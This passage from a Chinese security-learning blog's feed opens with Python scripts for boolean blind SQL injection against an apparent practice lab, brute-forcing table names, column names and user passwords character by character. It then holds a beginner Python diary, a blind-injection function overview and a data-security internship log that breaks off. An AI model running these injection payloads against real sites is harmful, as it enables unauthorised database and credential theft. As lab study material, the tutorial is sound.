class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + tablelen_payload).text:<br>            tablelen = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;:&quot;</span>, tablelen)<br>    <span class="hljs-comment"># 爆破名字</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, tablelen+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">128</span>):<br>            <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(l)+&quot;,1),&quot;+str(m)+&quot;,1))=&quot;+str(n)+&quot;#</span><br>            tablename_payload = <span class="hljs-string">&quot;?name=vince%27+and+ascii%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(m)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + tablename_payload).text:<br>                table_name = table_name + <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tablename&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, table_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/7.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h5 id="③爆列内容："><a href="#③爆列内容：" class="headerlink" title="③爆列内容："></a>③爆列内容：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆列的个数</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=&quot;+str(l)+&quot;#</span><br>    columnnumber_payload = <span class="hljs-string">&quot;?name=vince%27+and+%28select+count%28column_name%29+from+information_schema.columns+where+table_name%3D%27users%27%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + columnnumber_payload).text:<br>        columnnumber = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;tablenumber:&#x27;</span>, columnnumber)<br><br><span class="hljs-comment"># 爆列名（老规矩，先爆破长度，再爆破内容）</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, columnnumber):<br>    column_name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and length(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &quot;+str(l)+&quot;,1),1))=&quot;+str(i)+&quot;#</span><br>        columnlen_payload = <span class="hljs-string">&quot;?name=vince%27+and+length%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + columnlen_payload).text:<br>            columnlen = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, columnlen)<br>    <span class="hljs-comment"># 爆破名字</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, columnlen+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">128</span>):<br>            <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &quot;+str(l)+&quot;,1),&quot;+str(m)+&quot;,1))=&quot;+str(n)+&quot;#</span><br>            columnname_payload = <span class="hljs-string">&quot;?name=vince%27+and+ascii%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27users%27+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(m)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + columnname_payload).text:<br>                column_name = column_name + <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tablename&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, column_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/8.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h5 id="④爆数据内容："><a href="#④爆数据内容：" class="headerlink" title="④爆数据内容："></a>④爆数据内容：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆数据的条数</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>    <span class="hljs-comment"># 拼接完整的url   从users表中选username列   ?name=vince&#x27; and (select count(password) from users)=&quot;+str(l)+&quot;#</span><br>    datanumber_payload = <span class="hljs-string">&quot;?name=vince%27+and+%28select+count%28password%29+from+users%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + datanumber_payload).text:<br>        datanumber = l<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;datenumber:&#x27;</span>, datanumber)<br><br><span class="hljs-comment"># 爆数据内容（老规矩，先爆破长度，再爆破内容）</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, datanumber):<br>    data_name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>        <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and length(substr((select password from users limit &quot;+str(l)+&quot;,1),1))=&quot;+str(i)+&quot;#</span><br>        datalen_payload = <span class="hljs-string">&quot;?name=vince%27+and+length%28substr%28%28select+password+from+users+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;%23&amp;submit=查询&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + datalen_payload).text:<br>            datalen = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, datalen)<br>    <span class="hljs-comment"># 爆破名字</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, datalen+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">128</span>):<br>            <span class="hljs-comment"># 拼接完整的url ?name=vince&#x27; and ascii(substr((select password from users limit &quot;+str(l)+&quot;,1),&quot;+str(m)+&quot;,1))=&quot;+str(n)+&quot; #</span><br>            dataname_payload = <span class="hljs-string">&quot;?name=vince%27+and+ascii%28substr%28%28select+password+from+users+limit+&quot;</span>+<span class="hljs-built_in">str</span>(l)+<span class="hljs-string">&quot;%2C1%29%2C&quot;</span>+<span class="hljs-built_in">str</span>(m)+<span class="hljs-string">&quot;%2C1%29%29%3D&quot;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&quot;+%23&amp;submit=查询&quot;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is:&#x27;</span> <span class="hljs-keyword">in</span> s.get(url + dataname_payload).text:<br>                data_name = data_name + <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dataname&quot;</span>+<span class="hljs-built_in">str</span>(l+<span class="hljs-number">1</span>), <span class="hljs-string">&quot;:&quot;</span>, data_name)<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E5%9E%8B/9.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h4><p>&emsp;&emsp;布尔类型经过两天的理论和代码研究就告一段落了，主要是自己手打了一遍代码，对过程和相关是函数使用有了很大的了解，对于参考的链接而言，受益匪浅但是有些地方不敢苟同，比如我习惯在注入时注意url的符号变化，在源代码中，由于部分没有变换，其实是有些走不通的，还是自己多研究多动手写脚本的来得好（虽然很多现成的，但不一定适合的啦）。有一说一，手动不如脚本，嘿嘿。接下来就是时间注入了，这个其实也是比较简单的啦，淦就完了。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python日记（一）</title>
    <link href="/2022/08/17/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2022/08/17/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Python日记（一）"><a href="#Python日记（一）" class="headerlink" title="Python日记（一）"></a>Python日记（一）</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;尽管自己一直有在使用python写东西，但是一直没有系统化的学习和掌握，总觉得自己有一些遗漏，在web渗透里也经常需要使用到脚本，使用python编写会有很好的优势（C语言其实跑得更加快，但是没有python方便的啦，毕竟语言类型都不一样）。所以就重新开始稳固语言把。</p><p>（跟着b站的某个系列视频走了一遍，嘿嘿）</p><p>&emsp;&emsp;</p><h4 id="1-Python的特点"><a href="#1-Python的特点" class="headerlink" title="1.Python的特点"></a>1.Python的特点</h4><ul><li><p><strong>简单、易学、开源：</strong></p><p>&emsp;&emsp;在Python的社区中，我们可以自由发布不同的版本，阅读、修改源代码并应用于新的软件之中</p></li><li><p><strong>解释型：</strong></p><p>&emsp;&emsp;学过计算机的都知道，计算机的语言可以分为编译型和解释型语言，编译型语言编译一次后，脱离了编译器也能运行，并且运行效率高。，但是存在可移植性的问题，而Python作为解释型语言，拥有着跨平台性好，通过不同的解释器，将相同的源代码解释成不同平台下机器码的优点，Python解释器会将源代码转化为中间字节码形式，然后将其解释卫将其语言并执行</p></li><li><p><strong>可移植：</strong></p><p>&emsp;&emsp;Python解释器已经被移植在许多的平台上，所以很多时候Python程序无需修改就可以在多个平台上运行，他的可移植强</p></li><li><p><strong>代码规范：</strong></p><p>&emsp;&emsp;Python所采用的强制缩进的方式，所以看其语言时是比较舒服的（C语言等用的是括号进行分别）</p></li></ul><p>&emsp;</p><h4 id="2-Hello-Word"><a href="#2-Hello-Word" class="headerlink" title="2.Hello Word"></a>2.Hello Word</h4><p>&emsp;&emsp;既然都学计算机语言了，总得会“Hello Word”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">liaoyue = <span class="hljs-string">&#x27;Hello Word&#x27;</span><br><span class="hljs-built_in">print</span>(liaoyue)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/1.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;好了，接下来就正式开始相关内容把。</p><p>&emsp;</p><h4 id="3-标识符"><a href="#3-标识符" class="headerlink" title="3.标识符"></a>3.标识符</h4><p>&emsp;&emsp;在Python语言中，其对标识符的设置是有一定要求和限制的：</p><ul><li><p><strong>区分大小写：</strong></p><p>&emsp;&emsp;LIAOyue和liaoyue是两个完全不同的变量</p></li><li><p><strong>字符限制：</strong></p><p>&emsp;&emsp;首字符可以是下划线（_）或者字母，但是不能为数字，但除了首字符外的其他字符必须是下划线、字母和数字</p></li><li><p><strong>关键字：</strong></p><p>&emsp;&emsp;关键字不能作为标识符</p></li><li><p><strong>内置函数：</strong></p><p>&emsp;&emsp;不能使用Python的内置函数作为自己的标识符</p></li></ul><p>&emsp;</p><h4 id="4-关键字"><a href="#4-关键字" class="headerlink" title="4.关键字"></a>4.关键字</h4><table><thead><tr><th align="center">False</th><th align="center">def</th><th align="center">if</th><th align="center">raise</th><th align="center">None</th><th align="center">del</th><th align="center">import</th><th align="center">return</th><th align="center">True</th><th align="center">elif</th><th align="center">in</th></tr></thead><tbody><tr><td align="center">try</td><td align="center">and</td><td align="center">else</td><td align="center">is</td><td align="center">while</td><td align="center">as</td><td align="center">except</td><td align="center">lambda</td><td align="center">with</td><td align="center">assert</td><td align="center">finally</td></tr><tr><td align="center">nonlocal</td><td align="center">yield</td><td align="center">break</td><td align="center">for</td><td align="center">not</td><td align="center">class</td><td align="center">from</td><td align="center">or</td><td align="center">continue</td><td align="center">global</td><td align="center">pass</td></tr></tbody></table><p>&emsp;</p><h4 id="5-变量"><a href="#5-变量" class="headerlink" title="5.变量"></a>5.变量</h4><p>&emsp;&emsp;在Python中，为一个变量赋值的同时就声明了该变量，该变量的数据类型就是赋值数据所属的类型，该变量还可以接受其他类型的数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-            # 为了能运行中文的注释</span><br><br><span class="hljs-keyword">from</span> pickle <span class="hljs-keyword">import</span> TRUE<br><br>liaoyue1 = <span class="hljs-string">&#x27;Hello Word&#x27;</span>   <span class="hljs-comment">#  字符型</span><br><span class="hljs-built_in">print</span>(liaoyue1)<br><br>liaoyue2 = <span class="hljs-number">12.0</span>       <span class="hljs-comment">#  浮点型</span><br><span class="hljs-built_in">print</span>(liaoyue2)<br><br>liaoyue3 = <span class="hljs-number">12</span>        <span class="hljs-comment">#  整数型</span><br><span class="hljs-built_in">print</span>(liaoyue3)<br><br>liaoyue3 = <span class="hljs-literal">True</span>       <span class="hljs-comment">#  转化为布尔型（动态类型语言的特点）</span><br><span class="hljs-built_in">print</span>(liaoyue3)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/2.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-语句"><a href="#6-语句" class="headerlink" title="6.语句"></a>6.语句</h4><p>&emsp;&emsp;对于Python而言，一行代码表示一个语句，在一般情况下语句结束时不加分号（也就是说可以加入分号也可以不加分号，但是为了整体的美观，不加分号是最舒服的）</p><p>\</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-            # 为了能运行中文的注释</span><br><br><span class="hljs-keyword">from</span> pickle <span class="hljs-keyword">import</span> TRUE<br><br>liaoyue1 = <span class="hljs-string">&#x27;Hello Word&#x27;</span>;   <span class="hljs-comment">#  字符型</span><br><span class="hljs-built_in">print</span>(liaoyue1);<br><br>liaoyue2 = <span class="hljs-number">12.0</span>;        <span class="hljs-comment">#  浮点型</span><br><span class="hljs-built_in">print</span>(liaoyue2);<br><br>liaoyue3 = <span class="hljs-number">12</span>;          <span class="hljs-comment">#  整数型</span><br><span class="hljs-built_in">print</span>(liaoyue3);<br><br>liaoyue3 = <span class="hljs-literal">True</span> ;       <span class="hljs-comment">#  转化为布尔型（动态类型语言）</span><br><span class="hljs-built_in">print</span>(liaoyue3);<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/3.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-代码注释"><a href="#7-代码注释" class="headerlink" title="7.代码注释"></a>7.代码注释</h4><p>&emsp;&emsp;与C语言不同的是，在C语言中使用的是//进行注释，而在Python使用的是#进行注释.而如果在代码的第一行使用以下的任意一个注释语句:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;这两个注释语句是等价的，他是告诉Python解释器该文件的编码集是UTF-8，可以避免产生代码中有中文等亚洲文字时无法解释文件的情况，一般尔雅你，改代码需要被放在文件的第一行或者第二行才会有效。</p><p>&emsp;</p><h4 id="8-模块"><a href="#8-模块" class="headerlink" title="8.模块"></a>8.模块</h4><p>&emsp;&emsp;在python语言中，对于模块的定义即是文件，导入语句有以下三种模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> &lt;模块名&gt;<br><span class="hljs-keyword">from</span> &lt;模块名&gt; <span class="hljs-keyword">import</span> &lt;代码元素&gt;<br><span class="hljs-keyword">from</span> &lt;模块名&gt; <span class="hljs-keyword">import</span> &lt;代码元素&gt; <span class="hljs-keyword">as</span> &lt;代码元素别名&gt;<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;通过上面的图片（来源于《看漫画学python》）解释我们可以很清楚的了解模块的作用的本质是是一种索引的方式罢了。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——盲注</title>
    <link href="/2022/08/16/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/"/>
    <url>/2022/08/16/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——盲注"><a href="#SQL注入——盲注" class="headerlink" title="SQL注入——盲注"></a>SQL注入——盲注</h1><h4 id="1-盲注概述"><a href="#1-盲注概述" class="headerlink" title="1.盲注概述"></a>1.盲注概述</h4><p>&emsp;&emsp;在SQL的注入中，并不是所有的注入都能像联合查询注入和报错注入那样子获得回显信息的，有时候，在SQL语句执行完查询后，查询数据并不能回显到页面，当中，这个时候就需要用一些特殊的方法来判断或者尝试，这个过程称之为盲注。</p><p>&emsp;&emsp;如果数据库运行反馈的结果反馈出的内容是对错等相类似的逻辑信息，那我们就可以根据逻辑信息的变化来获取我们想要的内容。</p><p>&emsp;</p><h4 id="2-盲注的分类"><a href="#2-盲注的分类" class="headerlink" title="2.盲注的分类"></a>2.盲注的分类</h4><ul><li><p>&emsp;&emsp;布尔类型：</p><p>&emsp;&emsp;布尔型是计算机里的一种数据类型，只有True和False两个值，一般也称为逻辑型。布尔类型顾名思义就是反馈的信息只存在Ture和Fales，不论注入的内容是什么，他都只会返回正确或者错误</p></li><li><p>&emsp;&emsp;时间类型：</p><p>&emsp;&emsp;时间类型的返回值只有Ture，返回的情况都会按照正确来处理，但是由于加入了特定的时间函数，所以可以通过web页面返回的时间来判断注入语句是否正确和成功</p></li></ul><p>&emsp;</p><h4 id="3-盲注的部分函数"><a href="#3-盲注的部分函数" class="headerlink" title="3.盲注的部分函数"></a>3.盲注的部分函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">#返回字符串的长度<br>Length（）<br>  <br>#截取字符串<br>Substr（）<br><br>#返回字符的ascii码<br>Ascii（）  <br> <br>#将程序挂起一段时间 n为n秒<br>sleep(n)<br><br>#判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句<br>if(expr1,expr2,expr3):<br></code></pre></td></tr></table></figure><ul><li>&emsp;&emsp;Length（）:</li></ul><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/1.jpg" style="zoom: 80%;" /></center><ul><li>&emsp;&emsp;Substr（）:</li></ul><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/2.jpg" style="zoom: 80%;" /></center><ul><li>&emsp;&emsp;Ascii（） :</li></ul><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/3.jpg" style="zoom: 67%;" /></center><ul><li>&emsp;&emsp;sleep(n):</li></ul><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/4.jpg" style="zoom: 80%;" /></center><ul><li><p>&emsp;&emsp;if(expr1,expr2,expr3):</p><ul><li>错误情况：</li></ul></li></ul>  <center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/5.jpg" style="zoom: 80%;" />  </center><ul><li>正确情况：</li></ul>  <center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/6.jpg" style="zoom: 80%;" />  </center>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据安全工作日记</title>
    <link href="/2022/08/15/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <url>/2022/08/15/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%AE%9E%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="工作日记"><a href="#工作日记" class="headerlink" title="工作日记"></a>工作日记</h1><h6 id="7-25日"><a href="#7-25日" class="headerlink" title="7.25日:"></a>7.25日:</h6><ul><li>&emsp;&emsp;阅读法律法规（三法一条）</li></ul><h6 id="7-26日"><a href="#7-26日" class="headerlink" title="7.26日:"></a>7.26日:</h6><ul><li>&emsp;&emsp;阅读数据安全治理白皮书及相应的数据安全报刊</li></ul><h6 id="7-27日"><a href="#7-27日" class="headerlink" title="7.27日:"></a>7.27日:</h6><ul><li>&emsp;&emsp;整理数据安全相关法律清单及相关内容</li></ul><h6 id="7月28日"><a href="#7月28日" class="headerlink" title="7月28日:"></a>7月28日:</h6><ul><li>&emsp;&emsp;熟悉了业务，梳理的工作依据包含方向并尝试行业数据安全工作依据梳理</li></ul><h6 id="7月29日"><a href="#7月29日" class="headerlink" title="7月29日:"></a>7月29日:</h6><ul><li>&emsp;&emsp;行业数据安全相关法律法规(政务行业方向)整理出了excel形式的业务依据</li></ul><h6 id="7月30日-7月31"><a href="#7月30日-7月31" class="headerlink" title="7月30日-7月31:"></a>7月30日-7月31:</h6><ul><li>&emsp;&emsp;周末</li></ul><h6 id="8月1日"><a href="#8月1日" class="headerlink" title="8月1日:"></a>8月1日:</h6><ul><li>&emsp;&emsp;同步相关信息内容</li><li>&emsp;&emsp;《数据安全技术前沿研究笔记》第一章阅读</li></ul><h6 id="8月2日"><a href="#8月2日" class="headerlink" title="8月2日:"></a>8月2日:</h6><ul><li>&emsp;&emsp;数据出（跨）境的基础法律、行政法规、部门规章、要求及其联系的查找</li><li>&emsp;&emsp;继续整理政务行业的相关法律法规</li></ul><h6 id="8月3日："><a href="#8月3日：" class="headerlink" title="8月3日："></a>8月3日：</h6><ul><li>&emsp;&emsp;行业数据安全相关法律法规(卫健行业方向)整理出了excel形式的业务依据</li><li>&emsp;&emsp;数据出境100问的知识梳理</li></ul><h6 id="8月4日："><a href="#8月4日：" class="headerlink" title="8月4日："></a>8月4日：</h6><ul><li>&emsp;&emsp;继续整理政务行业的相关法律法规</li><li>&emsp;&emsp;数据出境安全评估研讨会（记录内容）</li></ul><h6 id="8月5日："><a href="#8月5日：" class="headerlink" title="8月5日："></a>8月5日：</h6><ul><li>&emsp;&emsp;整理政务行业和卫健行业word形式的相关法律法规全文</li><li>&emsp;&emsp;《数据安全技术前沿研究笔记》第一章总结</li></ul><h6 id="8月6日-8月7日："><a href="#8月6日-8月7日：" class="headerlink" title="8月6日-8月7日："></a>8月6日-8月7日：</h6><ul><li>&emsp;&emsp;周末</li></ul><h6 id="8月8日："><a href="#8月8日：" class="headerlink" title="8月8日："></a>8月8日：</h6><ul><li>&emsp;&emsp;数据安全相关研讨会的查找</li><li>&emsp;&emsp;《数据安全技术前沿研究笔记》第二章阅读</li></ul><h6 id="8月9日："><a href="#8月9日：" class="headerlink" 